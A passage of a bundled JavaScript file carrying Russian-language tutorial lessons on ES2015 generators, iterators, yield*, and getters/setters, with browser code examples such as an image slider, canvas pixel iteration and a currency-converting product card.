'https://cdn.pixabay.com/photo/2023/10/06/07/14/plant-8297610_1280.jpg',\n  'https://cdn.pixabay.com/photo/2023/10/12/14/41/town-8310950_1280.jpg',\n  'https://cdn.pixabay.com/photo/2017/01/18/16/46/hong-kong-1990268__340.jpg',\n  'https://cdn.pixabay.com/photo/2013/03/02/02/41/city-89197__340.jpg',\n  'https://cdn.pixabay.com/photo/2017/12/10/17/40/prague-3010407__340.jpg',\n  'https://cdn.pixabay.com/photo/2018/01/31/12/16/architecture-3121009__340.jpg',\n  'https://cdn.pixabay.com/photo/2015/02/24/13/23/city-647400__340.jpg',\n  'https://cdn.pixabay.com/photo/2018/11/29/21/19/hamburg-3846525__340.jpg'\n]\n\nclass PictureSlider {\n  constructor (pictures, container = document.body) {\n    this.container = container\n    this.pictures = pictures\n\n    this.currentSlide = 0\n    this.currentPicture = 0\n    this.slides = [0, 1].map(() => this.createSlide())\n    this.setPicture()\n\n    this.iterator = (function * () {\n      while (true) {\n        this.currentPicture = this.getNextPictureNum()\n\n        ;[this.currentSlide, Math.abs(this.currentSlide - 1)]\n          .forEach((num, index) => this.moveSlide(num, !!index))\n        this.currentSlide = Math.abs(this.currentSlide - 1)\n        this.setPicture()\n\n        yield this.slides[this.currentSlide]\n      }\n    }).call(this)\n  }\n\n  createSlide () {\n    const slide = this.container.appendChild(document.createElement('figure'))\n    return Object.assign(slide, {\n      style: `\n        position: absolute;\n        top: 10%;\n        bottom: 10%;\n        left: 10%;\n        right: 10%;\n        transition: all 0.5s;\n        background-size: contain;\n        background-repeat: no-repeat;\n        background-position: center center;\n      `,\n      onclick: function () { this.iterator.next() }.bind(this)\n    })\n  }\n\n  moveSlide (slideNum, isActive) {\n    Object.assign(this.slides[slideNum].style, {\n      left: `${ isActive ? 10 : -100 }%`,\n      right: `${ isActive ? 10 : 100 }%`,\n      opacity: isActive ? 1 : 0\n    })\n  }\n\n  getNextPictureNum () {\n    return this.currentPicture < this.pictures.length - 1\n      ? this.currentPicture + 1\n      : 0\n  }\n\n  setPicture () {\n    this.slides[this.currentSlide]\n      .style\n      .backgroundImage = `url(${this.pictures[this.currentPicture]})`\n  }\n}\n\nconst pictureSlider = new PictureSlider(pictures)\n~~~~\n\n{{{generators-17.js}}}\n\n_______________________________________________________\n\n◘◘![ico-25 cap] ** 11**◘◘\n\n~~~js\nObject.assign(document.body.appendChild(document.createElement('button')), {\n  innerText: 'new',\n  onclick: function (event) {\n    const { value, done } = getAvatar.next()\n    if (!done) document.body.appendChild(value)\n  }\n})\n\nfunction* avaGenerator () {\n  let num = 9\n  while (++num < 99) {\n    yield Object.assign(document.createElement('img'), {\n      src: `https://www.shareicon.net/data/2015/12/14/2078${num}_face_300x300.png`,\n      width: 80\n    })\n  }\n}\n\nconst getAvatar = avaGenerator ()\n~~~\n\n{{{generators-18.js}}}\n\n_________________________________________________________\n\n[![ico-30 hw] Quiz](quiz/gen)\n"},53924:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Генераторы и итераторы\n\n**ES 2015**\n\n_______________________________________________________\n\n## ![ico-25 icon] yield*\n\n**yield*** позволяет переключаться с одного протокола итерирования на другой.\n\nКак мы знаем, протокол итерирования задается в функции-генераторе.\n\nПоэтому для переключения нужно после **yield*** указать ссылку на генератор.\n\n_______________________________________________________\n\nПри клике на странице вызывается метод **~next()~** объекта **iterator**.\n\nОднако протокол итерирования, заложенный в объекте **iterator**, предусматривает переход по условию на другой протокол перебора значений, который задается функцией-генератором. **generator**\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\nconst generator = function * (arg) {\n    while (true) { yield arg++ }\n}\n\nconst iterator = (function * (arg) {\n  while (true) { arg < 5 ? yield arg++ : yield * generator(50) }\n})(0)\n\n\ndocument.body.onclick = function (event) {\n  const { value, done } = iterator.next()\n  console.log(value)\n}\n~~~\n\n___________________________________________________\n\nВ этом примере есть две функции-генератора: **generator1** и **generator2**\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js\nconst generator1 = function * (arg) {\n  while (true) {\n    arg++ < 5 ? yield 'generator1: ' + arg : yield * generator2()\n  }\n}\n\nfunction * generator2 () {\n  while (true) {\n    Math.random() > 0.3 ? yield 'generator2' : yield * generator1(0)\n  }\n}\n~~~\n\nВ функции-генераторе **generator2** в зависимости от значения случайной величины происходит переход на протокол перебора значений, заложенный в функции-генераторе **generator1**\n\nВ свою очередь в функции-генераторе **generator1** в зависимости от значения аргумента **_arg_** происходит переход на протокол перебора значений, заложенный в функции-генераторе **generator2**\n\nСтартуем мы с протокола перебора значений, заложенном в функции-генераторе **generator2**\n\n~~~js\nconst iterator = generator2(3)\n~~~\n\nТеперь при клике на странице мы будем случайным образом переключаться с одного протокола итерирования на другой:\n\n~~~js\ndocument.body.onclick = event => console.log(iterator.next().value)\n~~~\n\n________________________________\n\nЕсли после оператора **yield*** следует итерабельный объект, то произойдет автоматический переход на встроенный протокол итерирования этого объекта\n\nКогда протокол будет исчерпан, управление вернется к текущему протоколу\n\nт.е. вместо протокола с **yield**:\n\n~~~js\nconst generator = function * () {\n  for (const x of [5, 4, 3, 2, 1]) yield x\n}\n~~~\n\nмы можем использовать протокол с **yield***:\n\n~~~js\nconst generator = function * () {\n  yield * [5, 4, 3, 2, 1].reverse()\n}\n\nconsole.log(...generator())\n~~~\n\n________________________________\n\n◘◘![ico-20 cap] ** 3**◘◘\n\n~~~js\nconst generator = function* () {\n  yield * [5, 4, 3, 2, 1]\n  yield * 'API'\n  yield * arguments\n}\n\nconst iterator = generator(10, 20, 30)\n\ndocument.body.onclick = function (event) {\n  console.log(iterator.next().value)\n}\n~~~\n\n_________________________________________________\n\n## ![ico-25 icon] return()\n\nЭтот метод позволяет остановить процесс итерирования до того, как протокол перебора значений будет исчерпан\n\n◘◘![ico-20 cap] ** 4**◘◘\n\n~~~js\nconst generator1 = function * () {\n  while (true) {\n    const x = Math.round(Math.random() * 10)\n    x > 5 ? yield 'generator1: ' + x : yield * generator2()\n  }\n}\n\nfunction * generator2() {\n  while ( true ) {\n    Math.random() > 0.3 ? yield 'generator2' : yield * generator1()\n  }\n}\nconst iterator = generator2(3)\n\n\ndocument.body.onclick = function (event) {\n  const { value } = iterator.next()\n  console.log(value)\n  if (value === 'generator1: 8') iterator.return()\n}\n~~~\n\n_________________________________________________________\n\n[![ico-30 hw] Quiz](quiz/gen)\n"},51656:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Генераторы и итераторы\n\n**ES 2015**\n\n^^Обычная функция не может быть приостановлена в середине кода и при следующем вызове продолжить с того места, где она остановилась.^^\n^^Единственный способ выйти из обычной функции до того, как ее код исполнится до конца - это оператор _return_ или _throw_.^^\n^^Если еще раз вызвать функцию, она начнет выполняться с начала.^^\n\n__________________________________________\n\n^^![ico-20 warn] Для того, чтобы обеспечить возможность приостановить выполнение кода и при следующем вызове продолжить с того места, где произошла остановка, в JS есть специальная функция-**генератор**.^^\n\n## ![ico-25 icon] Symbol.iterator\n\nДля того, чтобы некая коллекция данных (объект) была итерабельной, у нее должно быть определено свойство **~[Symbol.iterator]~**.\n\n**~[Symbol.iterator]~** должен быть ссылкой на функцию-**_генератор_** (т.е. быть методом).\n\nЧтобы быть **_генератором_**, этот метод должен удовлетворять следующим условиям:\n\n______________________________\n\n![ico-20 yes] Метод **~[Symbol.iterator]~** должен возвращать _объект_.\n![ico-20 yes] Этот объект должен иметь метод **_~next()~_**.\n![ico-20 yes] Метод **_~next()~_** должен возвращать объект со свойствами **_~value~_** и **_~done~_**.\n\n___________________________\n\n**Design pattern \"~Iterator~\"**\n\n^^Используя свойство **~Symbol.iterator~**, создадим итерабельный объект **browsers**.^^\n^^Для этого нам нужно, чтобы **~Symbol.iterator~** возвращал объект, у которого есть метод **~_next()_~**.^^\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\nconst browsers = {\n  [Symbol.iterator]() {\n    let step = 0\n    return {\n      next() {\n        step++\n        return step === 1\n          ? { value: 'Google', done: false }\n          : step === 2\n            ? { value: 'Mozilla', done: false }\n            : step === 3\n              ? { value: 'Safari', done: false }\n              : { value: '', done: true }\n      }\n   \t}\n  }\n}\n~~~\n\n^^Проверим, что объект **browsers** является итерабельным:^^\n\n~~~js\nfor (const name of browsers) {\n  console.log(name)\n}\n~~~\n\n{{{generators-1.js}}}\n\n\n^^Теперь объект **browsers** можно деструктурировать и применять к нему оператор ~spread~:^^\n\n~~~js\nconsole.log(...browsers)\n~~~\n\n~~~console\nGoogle Mozilla Safari\n~~~\n\n^^Что мы, собственно говоря, сделали:^^\n\n^^создали генератор **~[Symbol.iterator]~**, который определяет протокол итерирования объекта **browsers**, т.е. последовательность перебора значений.^^\n\n______________________________________\n\n## ![ico-25 icon] Генератор\n\n^^Предыдущий пример раскрывает принцип работы генератора.^^\n^^Однако нет необходимости создавать генераторы подобным образом.^^\n^^Этот шаблон проектирования уже реализован в языке встроенной функцией-генератором ![ico-20 smile]^^\n\nФункция-генератор объявляется с помощью ключевого слова ~function *~\n\n![ico-20 warn] ~ *~ - обязательный атрибут функции-генератора\n\nСама по себе функция-генератор ничего не итерирует,\nно задает последовательность перебора значений (_протокол итерирования_)\nи возвращает объект-**_итератор_**.\n\n~~~js\nconst iterator = generator(...)\n~~~\n\nПоскольку основная задача генератора - задать точки, в которых код будет приостановлен с возвратом промежуточного результата, очевидно, что нужна некая альтернатива оператору **~return~**, поскольку использование **~return~** приведет к завершению выполнения кода.\n\nТакой альтернативой является оператор  **~yield~**.\n\nЭтот оператор является инструкцией приостановки выполнения кода с возвратом промежуточного результата, следующего за оператором **~yield~**.\n\n^^Вспомним, как работает асинхронная функция:^^\n^^• она, как Карлсон, который живет на крыше, \"_улетел, но обещал вернуться_\" - нужно \"ловить\" момент ее \"возвращения\" методом  **_then_**^^\n^^• внутри код приостанавливается и ждет завершения очередной асинхронной операции, пока не дойдет до конца или оператора **_return_**^^\n\nКороче,\n\n| Управление | **Асинхронная функция** | **Генератор** |\n| _Приостановка_ | внутренняя<br>( **~await~** ) | внутренняя<br>( **~yield~** ) |\n| _Возобновление работы_ | внутреннее<br>( **~await~** ) | внешнее<br>( метод **~next()~** итератора ) |\n| | ~await~ отправляет колбэк в Event Loop и ждет его возвращения | ~yield~ выдает значение наружу и ждет очередного вызова ~next()~ |\n\n\n~~~js\nfunction* generator (...) {\n  ...\n  yield ...\n  ...\n  yield ...\n  ...\n}\n~~~\n\nПерепишем предыдущий пример с использованием функции-генератора:\n\n____________________\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js\nconst browsers = {\n  [Symbol.iterator]: function * () {\n    yield 'Google'\n    yield 'Mozilla'\n    yield 'Safari'\n  }\n}\n~~~\n\nКод явно стал короче и читабельнее ![ico-20 smile]\n\n_________________\n\n◘◘![ico-20 cap] ** 3**◘◘\n\n~~~js\nconst browsers = (function * () {\n  yield 'Chrome'\n  yield 'Mozilla'\n  yield 'Safari'\n  yield 'Edge'\n})()\n\nfor (const x of [1, 2, 3, 4]) setTimeout(() => console.log(browsers.next().value), 1000 * x)\n~~~\n\n{{{generators-3.js}}}\n\nПолучается прикольная штука:\nвесь код внутри генератора выполняется асинхронно\n^^(ведь заранее неизвестно, когда выполнение кода генератора возобновится начиная с места предыдущей остановки)^^\n\n___________________________\n\n\n## ![ico-25 icon] Итератор\n\n**Итератор** - это _объект_,\nу которого есть обязательный метод **~next()~**,\nи этот метод возвращает _объект_\nсо свойствами **~_value_~** и **~_done_~**.\n\nИтератор переходит от одного **~yield~** к следующему с помощью метода **~next()~**.\n\nВсе строго по протоколу ![ico-20 require]\n\n**~next()~** переставляет лапы итератору, заставляя его двигаться по намеченному маршруту ![ico-20 smile]\n\n### lazy evaluation\n\nПопробуйте запустить рекурсивную функцию:\n\n~~~js\nfunction recurse (arg) {\n  console.log(arg++)\n  recurse(arg)\n}\n\nrecurse(1)\n~~~\n\nна каком значении arg произойдет **RangeError** ?\n\nПоследнее значение, которое мы получим до **_Maximum call stack size exceeded_**, будет 11434\n\nА теперь используем итератор:\n\n~~~js\nconst lazyEvaluatedInfiniteList = (function * recurse (arg) {\n  while (true) { yield arg++ }\n})(0)\n\nfor (let x = 0; x < 12000; x++) {\n  console.log(lazyEvaluatedInfiniteList.next().value)\n}\n~~~\n\nПереполнения стека не происходит ![ico-20 wink]\n\nС помощью генератора можно создавать бесконечные списки,\nпоскольку генератор обеспечивает \"ленивые вычисления\" значений элементов списка,\nт.е. не нужно хранить их в памяти -\nмы просто ставим в соответствие каждому элементу бесконечного списка\nнекую функцию, которая вычислит в нужный момент его значение\n\n______________________________________________________________\n\n## ![ico-25 icon] next()\n\nУ объекта-**_итератора_** обязательно есть метод **~next()~**\n\nС помощью этого метода итератор переходит от текущего элемента структуры данных к следующему\n\n![ico-20 warn] Этот метод возвращает объект с двумя свойствами:    **_~value~_**  и  **_~done~_**\n\n• Свойство  **_~value~_**  содержит то, что указано в протоколе генератора после ключевого слова слова **~yield~**\n• Свойство  **_~done~_**  принимает значение  ~true~, когда процесс итерирования структуры данных завершен\n\n_____________________________________________________________\n\n◘◘![ico-20 cap] ** 4**◘◘\n\n~~~js\nfunction * colorsGenerator () {\n  const clr = () => Math.round(Math.random() * 255)\n  while (true) { yield `rgb(${clr()}, ${clr()}, ${clr()})` }\n}\n\nconst colorIterator = colorsGenerator()\n\nfor (let x=0; x < 100; x++) {\n  const point = document.body\n    .appendChild(document.createElement('div'))\n  point.style = `\n    float: left;\n    width: 10px;\n    height: 10px;\n    background-color: ${ colorIterator.next().value};\n  `\n}\n~~~\n\n{{{generators-4.js}}}\n\nИспользуя **IIFE**, можно сократь код:\n\n~~~js\nconst colorIterator = (function * () {\n  const clr = () => Math.round(Math.random() * 255)\n  while (true) { yield `rgb(${clr()}, ${clr()}, ${clr()})` }\n})()\n~~~\n\nТакже можно отдельно вынести в функцию код создания элемента с параметрами ширины и высоты:\n\n◘◘![ico-20 cap] ** 4.1**◘◘\n\n~~~js\nfunction createColoredElement (w, h) {\n  const point = document.createElement('div')\n  point.style = `\n    position: absolute;\n    width: ${w}px;\n    height: ${h}px;\n    background-color: ${ colorIterator.next().value};\n  `\n  return point\n}\n~~~\n\nПосле чего можно в цикле создавать элементы:\n\n~~~js\nfor (let x = 0; x < 75; x++) {\n  document.body\n    .appendChild(createColoredElement(400-x*5, 400-x*5))\n}\n~~~\n\n{{{generators-4-1.js}}}\n\n________________________________________________________________\n\nДобавим асинхронности в предыдущие примеры (4)\nПричем мы не будем использовать таймер,\nа воспользуемся **~requestAnimationFrame~**\n\n◘◘![ico-20 cap] ** 5**◘◘\n\n~~~js\nfunction * colorsGenerator () {\n  const clr = () => Math.round(Math.random() * 255)\n\n  while (true) {\n    let counter = 10\n    yield new Promise(resolve => requestAnimationFrame(function sigma () {\n      if (counter-- > 0) requestAnimationFrame(sigma)\n      else {\n        counter = 10\n        resolve(`rgb(${clr()}, ${clr()}, ${clr()})`)\n      }\n    }))\n  }\n}\n\nconst colorIterator = colorsGenerator()\n\nasync function showColors(num) {\n  const res = colorIterator.next()\n  const point = document.body\n    .appendChild(document.createElement('div'))\n  point.style = `\n    float: left;\n    width: 10px;\n    height: 10px;\n    background-color: ${await res.value};\n  `;\n  if (--num > 0) showColors(num)\n}\n\nshowColors(50)\n~~~\n\n{{{generators-5.js}}}\n\n________________________________________________________________\n\nДля бесконечной подзагрузки данных с сервера при прокрутке страницы можно также использовать итератор:\n\n◘◘![ico-20 cap] ** 6**◘◘\n\n~~~js\nconst iterator = (function * (arg) {\n  const add = user => Object.assign(document.body.appendChild(document.createElement('img')), {\n    src: user.avatar_url,\n    height: 100\n  })\n  while (true) {\n    yield fetch(`https://api.github.com/users?since=${arg}`)\n      .then(response => response.json())\n      .then(users => users.forEach(user => add(user)))\n    arg += 30\n  }\n})(0)\n\n\ndocument.body.onmousewheel = () => iterator.next()\n~~~\n\n________________________________________\n\n^^Пусть есть некий объект **user**^^\n\n◘◘![ico-20 cap] ** 7**◘◘\n\n~~~~js\nconst user = {\n  login: 'Сергей',\n  avatar: 'https://www.shareicon.net/data/2015/12/14/207817_face_300x300.png',\n  email: 'serg789@gmail.com',\n\n  place (tagName) {\n    return document.body.appendChild(document.createElement(tagName))\n  },\n\n  showAvatar () {\n    return Object.assign(this.place('img'), {\n      src: this.avatar,\n      width: 70\n    })\n  },\n\n  showLogin () {\n    return Object.assign(this.place('h3'), {\n      innerHTML: this.login\n    })\n  },\n\n  showEmail () {\n    return Object.assign(this.place('p'), {\n      innerHTML: this.email\n    })\n  }\n}\n~~~~\n\n^^С помощью генератора определим протокол итерирования этого объекта:^^\n\n~~~js\nuser.generator = function * () {\n  yield this.showLogin()\n  yield this.showEmail()\n  yield this.showAvatar()\n}\n~~~\n\n^^Теперь создадим объект итератора:^^\n\n~~~js\nuser.iterator = user.generator ()\n~~~\n\n^^и запустим цикл итерирования:^^\n\n~~~js\nwhile (!user.iterator.next().done) {}\n~~~\n\n^^На самом деле такое решение является чрезмерно громоздким^^\n\n^^Все значительно упростится с использованием глобального символа **~Symbol.iterator~**^^\n\n^^Если у объекта есть свойство  **~Symbol.iterator~**, то этот объект является итерабельным^^\n^^( то есть можно перебирать его свойства оператором for...of )^^\n\n**~Symbol.iterator~**  является ссылкой на функцию-генератор\n\n^^Используем **~Symbol.iterator~** в контексте предыдущего примера^^\n\n~~~js\nuser[Symbol.iterator] = function * () {\n  yield this.showLogin()\n  yield this.showEmail()\n  yield this.showAvatar()\n}\n~~~\n\n^^Теперь объект **user** можно итерировать обычным ~for...of~^^\n\n~~~js\nfor (const prop of user) {}\n~~~\n\n^^или воспользоваться оператором ~spread~:^^\n\n~~~js\nconsole.log(...user)\n~~~\n\n{{{generators-7.js}}}\n\n___________________________________________________________________\n\n◘◘![ico-20 cap] ** 8**◘◘\n\n~~~js\nconst elements = [\n  { tagName: 'h1', attrs: { id: 'first', innerText: 'first' } },\n  { tagName: 'h2', attrs: { id: 'second', innerText: 'second' } },\n  { tagName: 'h3', attrs: { id: 'third', innerText: 'third' } },\n  { tagName: 'p', attrs: { id: 'forth', innerText: 'forth' } }\n]\n\nelements[Symbol.iterator] = function * () {\n  let itemNum = 0\n  while (itemNum < this.length) {\n    yield (() => {\n      const elem = document.body\n        .appendChild(document.createElement(this[itemNum].tagName))\n      for (const attr in this[itemNum].attrs) elem[attr] = this[itemNum].attrs[attr]\n      itemNum++\n      return elem\n    })()\n  }\n}\n\nconsole.log(...elements)\n~~~\n\n{{{generators-8.js}}}\n\n___________________________________________________\n\n## ![ico-25 icon] Связные списки\n\n◘◘![ico-20 cap] ** 9**◘◘\n\n~~~js\nconst points = {\n  first:  { val: { x: 400, y: 30, c: '#09b' }, nextPoint: 'second' },\n  forth:  { val: { x: 100, y: 50, c: '#f50' }, nextPoint: 'fifth' },\n  sixth:  { val: { x: 300, y: 120, c: '#090' }, nextPoint: null },\n  third:  { val: { x: 200, y: 90, c: '#990' }, nextPoint: 'forth' },\n  fifth:  { val: { x: 50,  y: 100, c: '#f0f' }, nextPoint: 'sixth' },\n  second: { val: { x: 150, y: 150, c: '#0ff' }, nextPoint: 'third' }\n}\n\npoints[Symbol.iterator] = function * () {\n  let currentPoint = 'first'\n\n  const draw = (point) => {\n    const { x, y, c } = point\n    document.body\n      .appendChild(document.createElement('div'))\n      .style = `\n        width: 20px;\n        height: 20px;\n        border-radius: 50%;\n        background-color: ${c};\n        position: absolute;\n        top: ${y}px;\n        left: ${x}px;\n      `\n  }\n\n  while (currentPoint) {\n    draw(this[currentPoint].val)\n    currentPoint = this[currentPoint].nextPoint\n    yield currentPoint\n  }\n}\n\nconsole.log(...points)\n~~~\n\n{{{generators-9.js}}}\n\n___________________________________________________\n\n^^Пусть у нас есть массив объектов^^\n\n◘◘![ico-20 cap] ** 10**◘◘\n\n~~~js\nconst objects = [\n  { val: 'first',  nextItem: 'second' },\n  { val: 'forth',  nextItem: 'fifth' },\n  { val: 'sixth',  nextItem: null },\n  { val: 'third',  nextItem: 'forth' },\n  { val: 'fifth',  nextItem: 'sixth' },\n  { val: 'second', nextItem: 'third' }\n]\n~~~\n\n^^Каждый элемент массива содержит свойство **~nextItem~** - ссылку на другой элемент этого же массива^^\n\n^^Создадим протокол итерирования такого массива^^\n\n^^Пусть элементы массива перебираются не в том порядке, в котором они расположены в массиве, а по новому протоколу, т.е. следующим будет выбираться элемент, указанный в свойстве **~nextItem~** текущего элемента^^\n\n~~~js\nfunction * someGenerator (objs) {\n  let currentItem = objs[0]\n  let nextItem = objs[0]\n\n  while (!!nextItem) {\n    currentItem = nextItem\n    nextItem = !!currentItem.nextItem && objs.find(x => currentItem.nextItem === x.val) || null\n    yield currentItem.val\n  }\n}\n~~~\n\n^^Генератор принимает в качестве аргумента ссылку на итерируемый массив^^\n\n^^Создадим итератор для массива **objects**^^\n\n~~~js\nconst iterator = someGenerator(objects)\n~~~\n\n^^Теперь можно использовать метод ~next()~ итератора **_iterator_**^^\n\n______________________________________\n\n^^![ico-20 pin] Изменим протокол итерирования массива^^\n\n~~~js\nobjects[Symbol.iterator] = function * () {\n  let currentItem = this[0]\n  let nextItem = this[0]\n\n  while (!!nextItem) {\n    currentItem = nextItem\n    nextItem = !!currentItem.nextItem && this.find(x => currentItem.nextItem === x.val) || null\n    yield currentItem.val\n  }\n}\n~~~\n\n^^Теперь оператор ~for...of~ будет итерировать массив **objects** в нужном порядке^^\n\n~~~js\nfor (const obj of objects) console.log(obj)\n~~~\n\n^^Кроме того, при деструктуризации массива **objects** значения будут возвращены в указанном протоколом порядке^^\n\n~~~js\nconst [a, b, c, d] = objects\n~~~\n\n_________________________________________________________\n\n## ![ico-25 icon] Потоки данных\n\nРабота с большими объемамим данных может привести к снижению производительности кода\nВ этом случае лучше использовать потоки данных, которые можно читать небольшими фрагментами\n\nНапример, при работе с элементом ~canvas~ можно получить все пиксели изображения с помощью метода ~getImageData~, но это будет очень большой объем данных\n\nЧтобы не считывать сразу весь контекст элемента ~canvas~ в память, можно организовать чтение, например, по строкам пикселей\n\nМетод ~getImageData~ принимает 4 аргумента:\n\n~~~js\nconst canvas = document.body\n  .appendChild(document.createElement('canvas'))\n\nconst ctx = canvas.getContext('2d')\n\nconst imageData = ctx.getImageData(left, top, width, height)\n~~~\n\nТеперь мы можем получить данные о цвете пикселей:\n\n~~~js\nconst data = imageData.data\n~~~\n\nПолученный итерабельный объект ~data~ состоит из квартетов байт\nНа описание цвета каждого пикселя требуется 4 байта:\n3 байта на цветовые каналы red, green, blue\nи еще один байт - на альфа-канал, управляющий прозрачностью\n\nТаким образом, размер этого объекта будет в 4 раза больше, чем размер ~canvas~ в пикселях\n\nОчевидно, что такой большой объем данных требует значительных ресурсов памяти\nПоэтому \"читать\" и \"писать\" пиксели изображения лучше частями, например, построчно:\n\n\n◘◘![ico-20 cap] ** 11**◘◘\n\n~~~js\nconst canvas = document.body\n  .appendChild(document.createElement('canvas'))\n\n;[canvas.width, canvas.height] = [window.innerWidth, window.innerHeight]\n\ncanvas[Symbol.iterator] = function * () {\n  const ctx = this.getContext('2d')\n\n  let counter = 0\n\n  do {\n    const imageData = ctx.getImageData(0, counter, this.width, 1)\n    const row = imageData.data\n    for (let x = 0; x < row.length; x += 4) {\n      for (let index = 0; index < 4; index++) row[x + index] += counter\n\n      yield ctx.putImageData(imageData, 0, counter)\n\n    }\n  } while (counter++ < this.height)\n}\n~~~\n\nМетод ~putImageData~ записывает новые данные в контекст элемента ~canvas~\n\nДля более удачного результата лучше сначала настроить ~document.body~:\n\n~~~js\ndocument.body.style = `\n  background: #000;\n  padding: 0;\n  margin: 0;\n`\n~~~\n\nТеперь можно \"проитерировать\" canvas так:\n~~~js\nfor (const point of canvas) {}\n~~~\nили так:\n~~~js\nconsole.log(...canvas)\n~~~\n\nправда, в этом случае консоль будет забита undefined ![ico-20 wink]\n\n{{{generators-11.js}}}\n\nМожно немного изменить пример так, чтобы значение цвета пикселей было случайным\n\n~~~js\nconst canvas = Object.assign(document.body.appendChild(document.createElement('canvas')), {\n  width: window.innerWidth,\n  height: window.innerHeight,\n  [Symbol.iterator]: function * () {\n    const ctx = this.getContext('2d')\n    let counter = 0\n\n    do {\n      const imageData = ctx.getImageData(0, counter, this.width, 1)\n      const row = imageData.data\n      for (let x = 0; x < row.length; x += 4) {\n        for (let index = 0; index < 4; index++) row[x + index] = Math.round(Math.random() * 255)\n\n        yield ctx.putImageData(imageData, 0, counter)\n      }\n    } while (counter++ < this.height)\n  }\n})\n\nfor (const x of canvas) {}\n~~~\n\n{{{generators-11-1.js}}}\n\nМожно считывать и по одному пикселю:\n\n~~~js\nconst canvas = document.body\n  .appendChild(document.createElement('canvas'))\n\n;[canvas.width, canvas.height] = [window.innerWidth, window.innerHeight]\n\nconst ctx = canvas.getContext('2d')\n\ncanvas[Symbol.iterator] = function * () {\n  let counter = 0\n  do {\n    const [x, y] = [\n      Math.round(Math.random() * this.width),\n      Math.round(Math.random() * this.height)\n    ]\n    const imageData = ctx.getImageData(x, y, 1, 1)\n    const point = imageData.data\n\n    for (let index = 0; index < 4; index++) {\n      point[index] += Math.round(Math.random() * 255)\n    }\n\n    yield ctx.putImageData(imageData, x, y)\n\n  } while (counter++ < 1000)\n}\n\nfor (const x of canvas) {}\n~~~\n\n_________________________________________________________\n\n[![ico-30 hw] Quiz](quiz/gen)\n"},17817:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Вычисляемые свойства\n\nУ объекта могут быть свойства, значения которых вычисляются на основании значений других свойств\n\nТакие свойства объявляются с помощью функций **~get~** (геттера) и **~set~** (сеттера)\n\n~~~js\nvar sample = {\n  birth: 2004,\n  get years () {\n    return new Date().getFullYear() - this.birth\n  },\n  set years ( newVal ) {\n    this.birth = new Date().getFullYear() - newVal\n  }\n}\n~~~\n\nКогда мы запрашиваем значение вычисляемого свойства, вызывается геттер свойства:\n\n~~~js\nconsole.log(sample.years)\n~~~\n\nа когда мы присваиваем новое значение вычисляемому свойству:\n\n~~~js\nsample.years = 20\n~~~\n\nвызывается сеттер свойства, который меняет значение свойства ~birth~\n\n~~~js\nconsole.log(sample.birth)\n~~~\n\n_______________________________\n\n## ![ico-25 cap] PriceUAH\n\nПредположим, есть объект **~commodity~**, описывающий товар.\n\nЦена товара **_~priceUSD~_** установлена в долларах.\n\nПредположим, курс доллара устанавливается значением переменной **~course~**.\n\nДля получения цены товара в гривне нужно умножить цену товара в долларах на курс доллара.\n\nОднако крайне неудобно производить подобные операции каждый раз, когда нужна цена товара в гривне.\n\nСоздадим вычисляемое свойство **_~priceUAH~_**.\n\nДля этого объявим геттер и сеттер свойства.\n\n~~~js\nvar course = 28\n\nvar commodity = {\n  name: 'Iron',\n  mark: 'Tefal',\n  priceUSD: 20,\n\n  get priceUAH () {\n    return this.priceUSD * course\n  },\n  set priceUAH (newPriceUAH) {\n    this.priceUSD = newPriceUAH / course\n  }\n}\n~~~\n\n**Геттер** - это функция, которая будет вычислять актуальное значение цены товара в гривне и возвращать результат как значение свойства **~commodity.priceUAH~**.\n\n![ico-20 warn] У геттера не может быть аргументов\n\n**Сеттер** - это функция, которая будет получать новое значение цены товара в гривне (**_~newPriceUAH~_**) и пересчитывать цену товара в долларах (**~commodity.priceUSD~**) по текущему курсу (**_~course~_**).\n\nКаждый раз, когда мы будем обращаться к свойству **~commodity.priceUAH~**, будет срабатывать геттер.\n\n~~~js\nconsole.log(commodity.priceUAH) // 560\n~~~\n\nКаждый раз, когда мы будем присваивать новое значение свойству **~commodity.priceUAH~**, на самом деле будет вызываться функция-сеттер, которая будет изменять значение свойства **~commodity.priceUSD~**.\n\n\n~~~js\ncommodity.priceUAH = 250\n\nconsole.log(commodity.priceUSD) // 8.928571428571429\n~~~\n\n{{{get-and-set-price.js}}}\n\n^^^[Full code of example]\n\nLet's create elements to edit dollar exchange rate\n\n~~~js\nconst section = document.body\n\nconst [container, label, course] = ['div', 'span', 'input']\n  .map(tag => document.createElement(tag))\n\nObject.assign(section.appendChild(container), { style: 'padding: 24px;' })\nObject.assign(container.appendChild(label), { innerText: 'Dollar exchange rate: ' })\nObject.assign(container.appendChild(course), {\n  type: 'number',\n  value: 28.5,\n  onchange (event) {\n    Commodity.prototype.course = event.target.value\n    commodities.forEach(item => item.setPriceUAH())\n  }\n})\n~~~\n\nand now constructor of commodity\n\n~~~js\nfunction Commodity (name, priceUSD, picture) {\n  Object.assign(this, {\n    name,\n    priceUSD,\n    setPriceUAH () { priceUAH.value = this.priceUAH },\n    setPriceUSD () { priceUSDElement.innerText = this.priceUSD }\n  })\n\n  Object.defineProperty(this, 'priceUAH', {\n    get () {\n      return this.priceUSD * this.course\n    },\n    set (newPriceUAH) {\n      this.priceUSD = Math.round(newPriceUAH * 100 / this.course) / 100\n      this.setPriceUSD()\n    }\n  })\n\n  const card = Object.assign(this.addElem('figure'), {\n    style: `\n      font-family: Arial;\n      width: 160px;\n      border: solid 1px white;\n      padding: 24px;\n      float: left;\n      margin: 8px;\n      box-sizing: boreder-box;\n    `\n  })\n\n  const commodityName = Object.assign(this.addElem('h4', card), {\n    innerText: name,\n    style: 'margin-top: 0;'\n  })\n\n  const img = Object.assign(this.addElem('img', card), {\n    src: picture,\n    height: 100,\n    style: 'margin: 0 0 16px 24px'\n  })\n\n  const prices = this.addElem('div', card)\n\n  this.addElem('small', prices).innerText = 'Price (UAH): '\n\n  const priceUAH = Object.assign(this.addElem('input', prices), {\n    style: `\n      background: transparent;\n      width: 80px;\n      border: 0;\n      color: #09b;\n    `,\n    value: this.priceUAH,\n    onchange: function (event) {\n      this.priceUAH = event.target.value\n      